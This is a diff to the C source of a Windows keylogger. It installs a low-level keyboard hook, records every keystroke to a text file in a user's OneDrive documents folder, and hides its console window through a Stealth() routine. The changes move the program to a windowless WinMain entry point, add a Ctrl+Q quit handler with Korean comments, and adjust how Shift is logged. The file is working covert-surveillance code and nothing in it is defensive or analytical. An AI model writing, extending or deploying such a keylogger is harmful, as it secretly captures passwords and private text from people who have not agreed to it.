@@ -1,4 +1,6 @@
 #define UNICODE
+#define _WIN32_WINNT 0x0500
+
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
@@ -16,8 +18,8 @@ static const struct {
     {VK_RETURN, "\n"},
     {VK_SPACE, " "},
     {VK_TAB, "[TAB]"},
-    {VK_SHIFT, ""},
-    {VK_LSHIFT, ""},
+    {VK_SHIFT, "[SHIFT]"},
+    {VK_LSHIFT, "[SHIFT]"},
     {VK_RSHIFT, ""},
     {VK_CONTROL, "[CTRL+"},
     {VK_LCONTROL, "[CTRL+"},
@@ -41,6 +43,7 @@ HHOOK _hook;
 
 int ctrl = 0;
 int shift = 0;
+
 // This struct contains the data received by the hook callback. As you see in the callback function
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
@@ -106,9 +109,6 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         
         if (wParam == WM_KEYDOWN) 
         {
-
-           
-
             switch (key_stroke) {
             case VK_LCONTROL:
             case VK_RCONTROL:
@@ -118,10 +118,22 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 break;
             case VK_LSHIFT:
             case VK_RSHIFT:
-                shift = TRUE;
+                if (!shift) {
+                    shift = TRUE;
+                }
                 break;
             }
 
+            //Ctrl + Alt + Q를 체크하여 프로그램 종료
+            if (ctrl && (key_stroke == 'Q')) {
+                fputs("\n[QUIT]", output_file);
+                printf("\n[QUIT]");
+                fflush(output_file);
+                fclose(output_file); // 파일 핸들러를 닫음.
+                PostQuitMessage(0); // 메시지 루프에 종료 메시지를 보냄.
+                return -1; // 후킹 체인에 메시지 전달안함.
+            }
+            
             for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++)
             {
                 if (keyname[i].key == key_stroke)
@@ -230,12 +242,13 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                     {
                         key = tolower(key);
                     }
-                    //sprintf(output, "%c", key);
                 
                 }
                 sprintf(output, "%c", key);
                
             }
+            
+
             // instead of opening and closing file handlers every time, keep file open and flush.
             fputs(output, output_file);
             fflush(output_file);
@@ -270,31 +283,32 @@ void Stealth()
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
 #endif
 
-#ifdef INVISIBLE
+#ifdef INVISIBLE 
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
 }
 
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-    
-    const char* output_filename = "keylogger_f.log";
-    printf("Logging output to %s\n", output_filename);
-    output_file = output_file = fopen("C:\\Users\\goodr\\OneDrive\\문서\\keylogger_f.txt", "a");
-
-    // visibility of window
     Stealth();
 
+    const char* output_filename = "keylogger_f.log";
+    printf("Logging output to %s\n", output_filename);
+    output_file = output_file = fopen("C:\\Users\\goodr\\OneDrive\\문서\\keylogger_f.txt", "w+");
+
+    
     // set the hook
     SetHook();
 
     // loop to keep the console application running.
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
+    while(GetMessage(&msg, NULL, 0, 0) > 0)
     {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+
+    ReleaseHook();
 
     return 0;
 }
